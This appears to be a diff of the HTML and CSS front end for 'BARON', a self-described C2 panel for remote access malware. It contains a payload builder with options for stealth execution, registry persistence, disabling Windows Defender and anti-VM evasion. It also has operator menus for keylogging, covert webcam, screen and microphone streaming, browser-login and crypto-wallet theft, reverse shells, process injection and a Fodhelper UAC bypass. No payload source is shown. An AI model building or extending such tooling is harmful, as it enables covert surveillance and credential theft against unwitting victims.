-  .log-time{font-family:var(--mono);font-size:.72rem;color:var(--text-dim);white-space:nowrap;padding-top:1px}
-  .log-msg{font-size:.83rem;line-height:1.5}
-  .log-info .log-msg{color:var(--text)}
-  .log-warn .log-msg{color:#ffd26e}
-  .log-error .log-msg{color:var(--red)}
+        .os-icon { font-size: 1.2rem; margin-right: 10px; opacity: 0.9; }
 
-  /* ─── Alert ─── */
-  .alert-banner{color:var(--red);background:rgba(255,74,107,.08);border:1px solid rgba(255,74,107,.2);
-    border-radius:10px;padding:14px 18px;display:flex;align-items:center;gap:12px;margin-bottom:16px;font-size:.85rem}
+        /* -----------------------------------------------------
+           Context Menu (Right Click on Client)
+        ----------------------------------------------------- */
+        #context-menu {
+            position: fixed; z-index: 10000; width: 240px;
+            background: rgba(10, 10, 15, 0.85); backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border); border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
+            padding: 8px; display: none; opacity: 0; transform: scale(0.95);
+            transition: opacity 0.1s, transform 0.1s;
+        }
+        #context-menu.active { display: block; opacity: 1; transform: scale(1); }
+        .cm-group { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 4px 0; margin-bottom: 4px; }
+        .cm-group:last-child { border: none; margin: 0; padding-bottom: 0; }
+        .cm-title { font-size: 0.65rem; color: var(--text-muted); padding: 4px 12px; text-transform: uppercase; letter-spacing: 2px; }
+        .cm-item {
+            display: flex; align-items: center; gap: 12px;
+            padding: 10px 12px; border-radius: 8px; font-size: 0.85rem;
+            color: #fff; cursor: pointer; transition: 0.2s;
+        }
+        .cm-item i { width: 16px; text-align: center; color: var(--accent); }
+        .cm-item:hover { background: var(--accent); color: #000; }
+        .cm-item:hover i { color: #000; }
+        .cm-item.danger:hover { background: var(--danger); }
 
-  /* ─── Modal ─── */
-  #modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);
-    display:none;align-items:center;justify-content:center}
-  #modal-overlay.show{display:flex}
-  .modal{background:var(--bg1);border:1px solid var(--border);border-radius:20px;padding:32px;
-    width:560px;max-height:80vh;overflow-y:auto;box-shadow:0 30px 80px rgba(0,0,0,.8)}
-  .modal-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
-  .modal-title{font-size:1.1rem;font-weight:700}
-  .modal-close{background:none;border:none;color:var(--text-dim);font-size:1.5rem;cursor:pointer;line-height:1}
-  .modal-close:hover{color:var(--red)}
+        /* -----------------------------------------------------
+           Terminal / Logs Window
+        ----------------------------------------------------- */
+        .terminal-box {
+            background: rgba(0,0,0,0.5); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05);
+            padding: 15px; height: 100%; font-family: var(--font-mono); font-size: 0.85rem;
+            overflow-y: auto; display: flex; flex-direction: column; gap: 8px;
+        }
+        .log-line { display: flex; gap: 10px; line-height: 1.4; word-break: break-all; }
+        .log-time { color: var(--text-muted); flex-shrink: 0; }
+        .log-info { color: var(--text-main); }
+        .log-warn { color: var(--warning); }
+        .log-err { color: var(--danger); }
+        .log-succ { color: var(--success); }
+        .log-sys { color: var(--accent); font-weight: bold; }
 
-  /* ─── Pages ─── */
-  .page{display:none}
-  .page.active{display:flex;flex-direction:column;gap:24px}
+        /* -----------------------------------------------------
+           Builder Window & Form
+        ----------------------------------------------------- */
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 8px; }
+        
+        /* Modern Checkbox Toggle */
+        .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: rgba(0,0,0,0.2); border-radius: 12px; margin-bottom: 10px; border: 1px solid transparent; transition: 0.3s; }
+        .toggle-row:hover { border-color: rgba(255,255,255,0.1); }
+        .toggle-label { font-size: 0.9rem; display: flex; align-items: center; gap: 10px; }
+        .toggle-label i { color: var(--accent); width: 20px; text-align: center; }
+        
+        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.1); transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: #fff; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
+        input:checked + .slider:before { transform: translateX(20px); background-color: #000; }
 
-  /* ─── Streams ─── */
-  .stream-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
-  .stream-card{border-radius:14px;overflow:hidden;background:#000;border:1px solid var(--border);aspect-ratio:16/9;
-    display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
-  .stream-card img{width:100%;height:100%;object-fit:contain}
-  .stream-placeholder{color:var(--text-dim);font-size:.85rem;text-align:center;padding:20px}
-  .stream-controls{position:absolute;bottom:10px;right:10px;display:flex;gap:6px}
+        .btn-primary {
+            width: 100%; padding: 16px; background: var(--accent); color: #000;
+            font-family: var(--font-sans); font-weight: 800; border: none; border-radius: 12px; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; letter-spacing: 2px; margin-top: 10px;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px var(--accent-glow); }
 
-  @keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-  @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
-  .spin{animation:spin 1s linear infinite}
-</style>
+        /* -----------------------------------------------------
+           Theme Selector
+        ----------------------------------------------------- */
+        .theme-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .theme-btn {
+            padding: 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05);
+            background: rgba(0,0,0,0.3); color: #fff; cursor: pointer; transition: 0.3s;
+            display: flex; flex-direction: column; align-items: center; gap: 10px; font-weight: 600;
+        }
+        .theme-btn:hover { background: rgba(255,255,255,0.05); }
+        .theme-btn .color-blob { width: 30px; height: 30px; border-radius: 50%; box-shadow: 0 0 20px currentColor; }
+        .theme-btn.sapphire { color: #2f80ed; }
+        .theme-btn.emerald { color: #2ed573; }
+        .theme-btn.amethyst { color: #9b59b6; }
+        .theme-btn.ruby { color: #ff4757; }
+        .theme-btn.gold { color: #D4AF37; }
+
+    </style>
 </head>
 <body>
-<div class="canvas"></div>
-<div class="grid-bg"></div>
 
-<!-- LOGIN -->
-<div id="login">
-  <div class="login-wrap">
-    <div class="login-card">
-      <div class="login-logo">BARON</div>
-      <div class="login-sub">Sovereign Edition · v5.0</div>
-      <input class="inp" id="u" type="text" placeholder="Login" autocomplete="off">
-      <input class="inp" id="p" type="password" placeholder="Password">
-      <button class="btn-login" id="loginBtn" onclick="doLogin()">AUTHORIZE ›</button>
-      <div class="err" id="loginErr"></div>
-    </div>
-  </div>
-</div>
+    <!-- 3D Background Engine -->
+    <div id="canvas-container"></div>
+    <div class="ambient-mesh"></div>
 
-<!-- SHELL -->
-<div id="shell">
-  <!-- Sidebar -->
-  <aside class="sidebar">
-    <div class="sbar-top">
-      <div class="sbar-logo">BARON</div>
-      <div class="sbar-ver">SOVEREIGN EDITION · v5.0</div>
-      <div class="sbar-status"><span class="dot"></span><span id="srv-status">Server Online</span></div>
-    </div>
-    <nav class="nav">
-      <div class="nav-label">Operations</div>
-      <div class="nav-item active" data-page="dashboard" onclick="nav(this,'dashboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>Dashboard
-      </div>
-      <div class="nav-item" data-page="clients" onclick="nav(this,'clients')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>Agents
-      </div>
-      <div class="nav-item" data-page="builder" onclick="nav(this,'builder')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Builder
-      </div>
-      <div class="nav-label">Intel</div>
-      <div class="nav-item" data-page="streams" onclick="nav(this,'streams')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>Streams
-      </div>
-      <div class="nav-item" data-page="files" onclick="nav(this,'files')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Files
-      </div>
-      <div class="nav-item" data-page="logs" onclick="nav(this,'logs')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>Logs
-      </div>
-    </nav>
-    <div class="sbar-bot">
-      <div class="usr-card">
-        <div class="usr-av" id="usr-av">A</div>
-        <div><div class="usr-name" id="usr-name">—</div><div class="usr-role" id="usr-role">Loading…</div></div>
-      </div>
-      <button class="btn-logout" onclick="logout()">⏻ Disconnect</button>
-    </div>
-  </aside>
-
-  <!-- Main -->
-  <main class="main">
-    <div class="sovereign-wrapper">
-      <div class="sovereign-island" id="sv-island" onclick="toggleIsland()">
-        <div class="isl-left">
-          <div class="pg-title" id="pg-title">Dashboard</div>
+    <!-- Auth Screen -->
+    <div id="auth-screen">
+        <div class="glass-panel auth-card">
+            <h1 class="auth-logo">BARON</h1>
+            <div class="auth-sub">Sovereign Edition C2</div>
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="text" id="login-user" class="glass-input" placeholder="Operator ID" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-key"></i>
+                <input type="password" id="login-pass" class="glass-input" placeholder="Access Key">
+            </div>
+            <button id="btn-login" class="auth-btn">AUTHORIZE</button>
+            <div id="auth-error" style="color: var(--danger); margin-top: 15px; font-size: 0.85rem; min-height: 20px;"></div>
         </div>
-        <div class="isl-center" id="isl-center">
-          <span class="isl-info">System Operational</span>
-        </div>
-        <div class="isl-right">
-          <div class="theme-picker">
-            <div class="theme-dot" style="background:#d4af37" onclick="setTheme('gold', event)"></div>
-            <div class="theme-dot" style="background:#2f80ed" onclick="setTheme('sapphire', event)"></div>
-            <div class="theme-dot" style="background:#2ed573" onclick="setTheme('emerald', event)"></div>
-            <div class="theme-dot" style="background:#ff4757" onclick="setTheme('ruby', event)"></div>
-            <div class="theme-dot" style="background:#9b59b6" onclick="setTheme('amethyst', event)"></div>
-          </div>
-          <div class="time-chip" id="clock">00:00</div>
-        </div>
-      </div>
     </div>
 
-    <div class="content">
-
-      <!-- DASHBOARD -->
-      <div id="page-dashboard" class="page active">
-        <div class="stats-grid">
-          <div class="stat"><div class="stat-label">Total Agents</div><div class="stat-val" id="s-total">0</div><div class="stat-hint">All registered</div></div>
-          <div class="stat"><div class="stat-label">Online Now</div><div class="stat-val" id="s-online">0</div><div class="stat-hint">Last 5 minutes</div></div>
-          <div class="stat"><div class="stat-label">Tasks Sent</div><div class="stat-val" id="s-tasks">0</div><div class="stat-hint">Total dispatched</div></div>
-          <div class="stat"><div class="stat-label">Uptime</div><div class="stat-val" id="s-uptime">0h</div><div class="stat-hint">Server running</div></div>
+    <!-- Main Workspace (Desktop) -->
+    <div id="workspace">
+        
+        <!-- Dynamic Island -->
+        <div class="dynamic-island" id="dynamic-island" onclick="toggleIsland()">
+            <div class="island-content">
+                <div class="island-dot"></div>
+                <span id="island-text">System Active</span>
+            </div>
         </div>
-        <div id="alert-wrap"></div>
-        <div class="card">
-          <div class="card-head"><span class="card-title">Active Deployments</span><span class="card-badge pill pill-green" id="badge-online">0 online</span></div>
-          <div class="card-body" style="padding:0">
-            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP Address</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>
-            <tbody id="client-table"><tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr></tbody></table></div>
-          </div>
-        </div>
-      </div>
 
-      <!-- CLIENTS (same as dashboard table but bigger) -->
-      <div id="page-clients" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Agent Registry</span></div>
-          <div class="card-body" style="padding:0">
-            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>User</th><th>IP</th><th>Country</th><th>AV</th><th>Status</th><th>Actions</th></tr></thead>
-            <tbody id="agent-table"><tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr></tbody></table></div>
-          </div>
+        <!-- Left Dock -->
+        <div class="dock glass-panel">
+            <div class="dock-item active" data-tooltip="Network" onclick="wm.focus('win-clients')">
+                <i class="fa-solid fa-network-wired"></i>
+            </div>
+            <div class="dock-item" data-tooltip="Payload Builder" onclick="wm.open('win-builder')">
+                <i class="fa-solid fa-hammer"></i>
+            </div>
+            <div class="dock-item" data-tooltip="Terminal Logs" onclick="wm.open('win-logs')">
+                <i class="fa-solid fa-terminal"></i>
+            </div>
+            <div class="dock-item" data-tooltip="OS Settings" onclick="wm.open('win-settings')">
+                <i class="fa-solid fa-sliders"></i>
+            </div>
+            <div class="dock-item" data-tooltip="God Mode Admin" onclick="wm.open('win-admin')">
+                <i class="fa-solid fa-crown" style="color: var(--accent)"></i>
+            </div>
+            <div class="dock-item" data-tooltip="Changelog" onclick="wm.open('win-changelog')">
+                <i class="fa-solid fa-receipt"></i>
+            </div>
+            <div style="flex:1"></div>
+            <div class="dock-item" style="color: var(--danger)" data-tooltip="Engage Disconnect" onclick="logout()">
+                <i class="fa-solid fa-power-off"></i>
+            </div>
         </div>
-      </div>
 
-      <!-- BUILDER -->
-      <div id="page-builder" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Payload Builder</span><span class="card-badge pill" style="background:var(--gold-dim);color:var(--gold);border:1px solid var(--border)">C# / .NET</span></div>
-          <div class="card-body">
-            <div class="builder-grid">
-              <div>
-                <div class="form-group"><label class="form-label">C2 Server URL</label><input class="form-input" id="b-server" type="text" placeholder="https://your-app.onrender.com"></div>
-                <div class="form-group"><label class="form-label">Agent Name</label><input class="form-input" id="b-name" type="text" value="svchost" placeholder="Process name"></div>
-                <div class="form-group"><label class="form-label">Beacon Interval (ms)</label><input class="form-input" id="b-beacon" type="number" value="5000"></div>
-                <div class="form-group"><label class="form-label">Output Format</label>
-                  <select class="form-select" id="b-type"><option value="exe">EXE (Executable)</option><option value="source">Source Code (C#)</option></select>
+        <!-- Spatial Window: Clients -->
+        <div class="os-window focus" id="win-clients" style="z-index: 500;">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-globe"></i> Global Network</div>
+                <div class="win-controls">
+                    <button class="win-btn win-min" onclick="wm.minimize('win-clients')"></button>
+                    <button class="win-btn win-max" onclick="wm.maximize('win-clients')"></button>
+                    <button class="win-btn win-close" onclick="wm.close('win-clients')"></button>
                 </div>
-              </div>
-              <div>
-                <div style="margin-bottom:16px;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase">Options</div>
-                <div class="toggle-row"><div><div class="toggle-label">Hidden Window</div><div class="toggle-sub">Run without visible window</div></div><input type="checkbox" id="b-hidden" checked></div>
-                <div class="toggle-row"><div><div class="toggle-label">Persistence</div><div class="toggle-sub">Registry / Startup folder</div></div><input type="checkbox" id="b-persist"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Anti-Kill</div><div class="toggle-sub">Watchdog process</div></div><input type="checkbox" id="b-antikill"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Defender Disable</div><div class="toggle-sub">Windows Defender bypass</div></div><input type="checkbox" id="b-defender"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Fake Error</div><div class="toggle-sub">Show fake error on start</div></div><input type="checkbox" id="b-fakeerr"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Anti-Analysis</div><div class="toggle-sub">VM/Sandbox/Debugger detection</div></div><input type="checkbox" id="b-antianalysis"></div>
-                <div class="toggle-row"><div><div class="toggle-label" style="color:var(--gold)">Debug Mode</div><div class="toggle-sub">Show console with full logs</div></div><input type="checkbox" id="b-debug"></div>
-              </div>
             </div>
-            <div style="margin-top:24px;display:flex;gap:12px">
-              <button class="btn btn-gold" onclick="buildAgent()">⚡ Build Payload</button>
-              <button class="btn btn-outline" onclick="clearBuildOut()">Clear</button>
+            <div class="win-body" style="padding: 0;">
+                <table class="glass-table" id="clients-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Target / User</th>
+                            <th>IP Addr</th>
+                            <th>OS Info</th>
+                            <th>Integrity</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="clients-body">
+                        <!-- Dynamic Rows -->
+                    </tbody>
+                </table>
             </div>
-            <div id="build-out" style="margin-top:20px;display:none">
-              <div class="terminal">
-                <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div><span style="margin-left:8px;font-size:.75rem;color:var(--text-dim)">Build Output</span></div>
-                <div class="term-body" id="build-src" style="height:300px;color:#a8e6a8;white-space:pre;overflow:auto"></div>
-              </div>
-              <div style="margin-top:12px"><button class="btn btn-gold btn-sm" onclick="downloadBuild()">⬇ Download</button></div>
-            </div>
-          </div>
         </div>
-      </div>
 
-      <!-- STREAMS -->
-      <div id="page-streams" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Live Streams</span>
-            <select class="form-select" id="stream-cid" style="width:auto;padding:6px 10px;font-size:.8rem">
-              <option value="">— Select Agent —</option>
-            </select>
-          </div>
-          <div class="card-body">
-            <div class="stream-grid">
-              <div class="stream-card" id="screen-frame"><div class="stream-placeholder">🖥 Screen<br><small>Start stream to view</small></div></div>
-              <div class="stream-card" id="webcam-frame"><div class="stream-placeholder">📷 Webcam<br><small>Start stream to view</small></div></div>
+        <!-- Spatial Window: Builder -->
+        <div class="os-window" id="win-builder">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-hammer"></i> Payload Engine</div>
+                <div class="win-controls">
+                    <button class="win-btn win-close" onclick="wm.close('win-builder')"></button>
+                </div>
             </div>
-            <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
-              <button class="btn btn-gold btn-sm" onclick="sendStream('screen_start')">▶ Screen</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('screen_stop')">■ Stop Screen</button>
-              <button class="btn btn-gold btn-sm" onclick="sendStream('webcam_start')">▶ Webcam</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('webcam_stop')">■ Stop Webcam</button>
-              <button class="btn btn-gold btn-sm" onclick="sendStream('audio_start')">🔊 Audio</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('audio_stop')">■ Stop Audio</button>
+            <div class="win-body">
+                <div class="form-group">
+                    <label class="form-label">C2 Server URL</label>
+                    <input type="text" id="b-url" class="glass-input" value="https://example.com" style="padding-left: 15px;">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Beacon Jitter (ms)</label>
+                    <input type="number" id="b-beacon" class="glass-input" value="5000" style="padding-left: 15px;">
+                </div>
+                
+                <h4 style="margin: 20px 0 10px; color: var(--accent); letter-spacing: 2px;">Core Modules</h4>
+                
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-ghost"></i> Stealth Execution (Hidden)</div>
+                    <label class="switch"><input type="checkbox" id="b-hide" checked><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-anchor"></i> Registry Persistence</div>
+                    <label class="switch"><input type="checkbox" id="b-persist" checked><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label"><i class="fa-solid fa-shield-virus"></i> Disable Defender & AMDI</div>
+                    <label class="switch"><input type="checkbox" id="b-defend"><span class="slider"></span></label>
+                </div>
+                
+                <h4 style="margin: 20px 0 10px; color: var(--danger); letter-spacing: 2px;">God Mode Exploits</h4>
+
+                <div class="toggle-row">
+                    <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-skull"></i> Anti-Kill (BSOD Protection)</div>
+                    <label class="switch"><input type="checkbox" id="b-bsod"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <div class="toggle-label" style="color: var(--danger)"><i class="fa-solid fa-eye-slash"></i> Anti-VM / Analysis Evasion</div>
+                    <label class="switch"><input type="checkbox" id="b-anti"><span class="slider"></span></label>
+                </div>
+
+                <button class="btn-primary" onclick="compilePayload()" id="btn-build">Compile Binary</button>
             </div>
-          </div>
         </div>
-      </div>
 
-      <!-- FILES -->
-      <div id="page-files" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">File Manager</span></div>
-          <div class="card-body">
-            <div style="display:flex;gap:12px;margin-bottom:20px">
-              <input class="form-input" id="file-path" placeholder="C:\Users\..." style="flex:1">
-              <button class="btn btn-gold" onclick="listFiles()">Browse</button>
-              <button class="btn btn-outline" onclick="uploadModal()">Upload</button>
+        <!-- Spatial Window: Logs -->
+        <div class="os-window" id="win-logs">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-terminal"></i> Sovereign Terminal</div>
+                <div class="win-controls">
+                    <button class="win-btn win-close" onclick="wm.close('win-logs')"></button>
+                </div>
             </div>
-            <div class="terminal">
-              <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div></div>
-              <div class="term-body" id="file-out">Select an agent and browse a directory…</div>
+            <div class="win-body">
+                <div class="terminal-box" id="terminal">
+                    <div class="log-line"><span class="log-time">[SYS]</span> <span class="log-sys">Baron C2 Initialized. Secure Connection Established.</span></div>
+                </div>
             </div>
-          </div>
         </div>
-      </div>
 
-      <!-- LOGS -->
-      <div id="page-logs" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Server Logs</span><button class="btn btn-outline btn-sm" onclick="fetchLogs()">⟳</button></div>
-          <div class="card-body" id="log-body" style="max-height:70vh;overflow-y:auto"></div>
+        <!-- Spatial Window: Settings -->
+        <div class="os-window" id="win-settings">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-sliders"></i> OS Theming</div>
+                <div class="win-controls">
+                    <button class="win-btn win-close" onclick="wm.close('win-settings')"></button>
+                </div>
+            </div>
+            <div class="win-body">
+                <p style="margin-bottom: 20px; color: var(--text-muted);">Select Interface Resonance Matrix:</p>
+                <div class="theme-grid">
+                    <div class="theme-btn gold" onclick="setTheme('gold')">
+                        <div class="color-blob"></div> Sovereign Gold
+                    </div>
+                    <div class="theme-btn sapphire" onclick="setTheme('sapphire')">
+                        <div class="color-blob"></div> Deep Sapphire
+                    </div>
+                    <div class="theme-btn ruby" onclick="setTheme('ruby')">
+                        <div class="color-blob"></div> Blood Ruby
+                    </div>
+                    <div class="theme-btn emerald" onclick="setTheme('emerald')">
+                        <div class="color-blob"></div> Toxic Emerald
+                    </div>
+                    <div class="theme-btn amethyst" onclick="setTheme('amethyst')">
+                        <div class="color-blob"></div> Void Amethyst
+                    </div>
+                </div>
+            </div>
         </div>
-      </div>
 
-    </div><!-- content -->
-  </main>
-</div><!-- CONTEXT MENU -->
-<div id="ctx-menu" onclick="event.stopPropagation()">
-  <div class="ctx-header" id="ctx-target" style="color:var(--gold)">AGENT ID</div>
-  <div class="ctx-item" onclick="ctxCmd('info')">⚙️ SysInfo</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">👁 Surveillance</div>
-  <div class="ctx-item" onclick="ctxCmd('screen_start')">🖥 Screen Stream</div>
-  <div class="ctx-item" onclick="ctxCmd('webcam_start')">📷 Webcam Stream</div>
-  <div class="ctx-item" onclick="ctxCmd('audio_start')">🔊 Audio / Mic Stream</div>
-  <div class="ctx-item" onclick="ctxCmd('keylog_start')">⌨️ Keylogger (Start)</div>
-  <div class="ctx-item" onclick="ctxCmd('keylog_stop')">⌨️ Keylogger (Dump & Stop)</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">💰 Data Extraction</div>
-  <div class="ctx-item" style="color:var(--gold)" onclick="ctxCmd('grabber')">👑 Ultimate Grabber</div>
-  <div class="ctx-item" onclick="ctxCmd('browsers')">🔑 Browser Logins</div>
-  <div class="ctx-item" onclick="ctxCmd('clipboard_start')">📋 Start Clipboard Watch</div>
-  <div class="ctx-item" onclick="ctxCmd('clipboard_stop')">📋 Stop Clipboard Watch</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">⚡ System Control</div>
-  <div class="ctx-item" onclick="openAgent(SELECTED_CID); hideCtx()">⌨️ Interactive Reverse Shell</div>
-  <div class="ctx-item" onclick="ctxCmd('processes')">📊 Task Manager List</div>
-  <div class="ctx-item" onclick="ctxCmd('netstat')">🌐 Netstat Logs</div>
-  <div class="ctx-item danger" onclick="ctxCmd('power')">⚡ System Reboot</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header danger">☠ Survival & Evasion (Hardcore)</div>
-  <div class="ctx-item danger" onclick="ctxCmd('inject')">💉 Inject (Melt & Migrate)</div>
-  <div class="ctx-item danger" onclick="ctxCmd('defender')">🛡️ Silence Defender (PS)</div>
-  <div class="ctx-item danger" onclick="ctxCmd('uac')">👑 Elevate UAC (Fodhelper)</div>
-  <div class="ctx-item danger" onclick="ctxCmd('kill')">☠️ Terminate Agent</div>
-</div>
+        <!-- Spatial Window: Admin Center -->
+        <div class="os-window" id="win-admin">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-crown" style="color: var(--accent)"></i> God Mode Admin Center</div>
+                <div class="win-controls">
+                    <button class="win-btn win-close" onclick="wm.close('win-admin')"></button>
+                </div>
+            </div>
+            <div class="win-body">
+                <h4 style="margin-bottom: 20px; color: var(--text-muted); text-transform: uppercase;">Server Control</h4>
+                <div class="admin-grid">
+                    <div class="admin-card" onclick="adminAction('clear_logs')">
+                        <i class="fa-solid fa-eraser"></i>
+                        <h4>Wipe Logs</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Clear all terminal events</p>
+                    </div>
+                    <div class="admin-card" onclick="adminAction('clean_db')">
+                        <i class="fa-solid fa-database"></i>
+                        <h4>Clean Database</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Remove dead ghosts</p>
+                    </div>
+                    <div class="admin-card danger" onclick="adminAction('panic')">
+                        <i class="fa-solid fa-radiation"></i>
+                        <h4>Global Panic</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Terminate all connections</p>
+                    </div>
+                    <div class="admin-card danger" onclick="adminAction('nuke_db')">
+                        <i class="fa-solid fa-bomb"></i>
+                        <h4>Nuke Database</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Factory Reset C2</p>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-<!-- MODAL -->
-<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
-  <div class="modal" id="modal-box">
-    <div class="modal-head">
-      <div class="modal-title" id="modal-title">Agent Control</div>
-      <button class="modal-close" onclick="closeModal()">×</button>
+        <!-- Spatial Window: Changelog -->
+        <div class="os-window" id="win-changelog">
+            <div class="win-header">
+                <div class="win-title"><i class="fa-solid fa-receipt"></i> System Changelog</div>
+                <div class="win-controls">
+                    <button class="win-btn win-close" onclick="wm.close('win-changelog')"></button>
+                </div>
+            </div>
+            <div class="win-body">
+                <div class="cl-item">
+                    <div class="cl-version">v3.0 Sovereign (God Mode)</div>
+                    <div class="cl-date">21 March 2026</div>
+                    <ul class="cl-list">
+                        <li><b>UI Transformation:</b> Full rewrite into a Spatial WebGL OS.</li>
+                        <li><b>Three.js Background:</b> High-tech interactive wireframe globe.</li>
+                        <li><b>Dynamic Island:</b> Top notification bubble for instant alerts.</li>
+                        <li><b>Window Manager v2:</b> Fully draggable, z-index managed windows.</li>
+                        <li><b>Security Phase 1:</b> Tarpitting, IP-Whitelisting, Honeypots embedded.</li>
+                        <li><b>File Integrity:</b> FIM thread active on server.py.</li>
+                        <li><b>New Context Menu:</b> 12+ modules mapped in right-click logic.</li>
+                    </ul>
+                </div>
+                <div class="cl-item">
+                    <div class="cl-version">v2.1 Tactical Update</div>
+                    <div class="cl-date">10 March 2026</div>
+                    <ul class="cl-list">
+                        <li>Fixed Roslyn compiler paths (`csc.exe`).</li>
+                        <li>Added Extractors: Telegram, Cold Crypto Wallets.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Custom Context Menu for Clients -->
+        <div id="context-menu">
+            <div class="cm-group">
+                <div class="cm-title">Surveillance</div>
